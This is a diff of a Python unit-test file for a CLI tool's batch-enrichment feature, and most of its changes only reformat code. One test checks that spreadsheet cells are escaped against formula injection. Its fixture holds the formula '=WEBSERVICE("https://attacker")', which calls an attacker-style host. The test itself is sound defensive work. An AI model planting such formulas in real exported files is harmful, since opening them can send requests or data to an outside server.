@@ -56,9 +56,7 @@ class TestEnrichBatch:
                 "Sector": ["Tech", "Tech", "Tech"],
             }
         )
-        col_map = _ColumnMap(
-            company="Account Name", website="URL", industry="Sector", context=[]
-        )
+        col_map = _ColumnMap(company="Account Name", website="URL", industry="Sector", context=[])
         monkeypatch.setattr(
             "primr.core.cli._prepare_batch_df",
             MagicMock(return_value=(df, col_map)),
@@ -80,9 +78,7 @@ class TestEnrichBatch:
                 "Sector": ["Tech", "Tech", "Tech", "Tech"],
             }
         )
-        col_map = _ColumnMap(
-            company="Account Name", website="URL", industry="Sector", context=[]
-        )
+        col_map = _ColumnMap(company="Account Name", website="URL", industry="Sector", context=[])
         monkeypatch.setattr(
             "primr.core.cli._prepare_batch_df",
             MagicMock(return_value=(df, col_map)),
@@ -118,14 +114,12 @@ class TestEnrichBatch:
         """Lines starting with =, +, -, @, \\t, \\r get single-quote prefix."""
         df = pd.DataFrame(
             {
-                "Account Name": ["=WEBSERVICE(\"https://attacker\")"],
+                "Account Name": ['=WEBSERVICE("https://attacker")'],
                 "URL": ["+1234567890"],
                 "Sector": ["Tech"],
             }
         )
-        col_map = _ColumnMap(
-            company="Account Name", website="URL", industry="Sector", context=[]
-        )
+        col_map = _ColumnMap(company="Account Name", website="URL", industry="Sector", context=[])
         monkeypatch.setattr(
             "primr.core.cli._prepare_batch_df",
             MagicMock(return_value=(df, col_map)),
